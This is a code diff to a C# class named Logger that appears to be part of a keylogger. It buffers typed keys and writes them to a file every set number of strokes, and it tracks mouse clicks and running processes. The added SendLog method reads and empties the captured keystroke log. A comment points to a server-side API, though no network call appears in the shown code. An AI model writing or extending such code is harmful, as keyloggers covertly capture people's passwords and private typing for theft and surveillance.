@@ -8,6 +8,7 @@ public class Logger
     private int _strokes = 0; // used to determine when invoke a server-side api
     private DateTime _previousClick = DateTime.Now; // used to determine double-left-click
     private String _processes = ""; // used to determine if a process is running
+    private bool _deleting = false;
     
     public Logger()
     {
@@ -39,7 +40,7 @@ public class Logger
     {
         _line += key;
         _strokes++;
-        if (_strokes < 64) return;
+        if (_strokes < Constants.LINE_LENGHT) return;
         _strokes = 0;
         Log();
     }
@@ -64,6 +65,7 @@ public class Logger
     private void Log()
     {
         // method that logs the current line
+        if(_deleting) return;
         using (StreamWriter w = File.AppendText(Constants.PATH))
         {
             w.WriteLine(_line);
@@ -73,7 +75,20 @@ public class Logger
 
     public void SendLog()
     {
-        Console.WriteLine(_line);
+        _deleting = true;
+        String body = "";
+        using (StreamReader w = File.OpenText(Constants.PATH))
+        {
+            String line = w.ReadLine();
+            while ( line!= null)
+            {
+                body += line;
+                line = w.ReadLine();
+            }
+        }
+        File.WriteAllText(Constants.PATH,string.Empty);
+        _deleting = false;
+        Console.WriteLine(body);
     }
     
 }
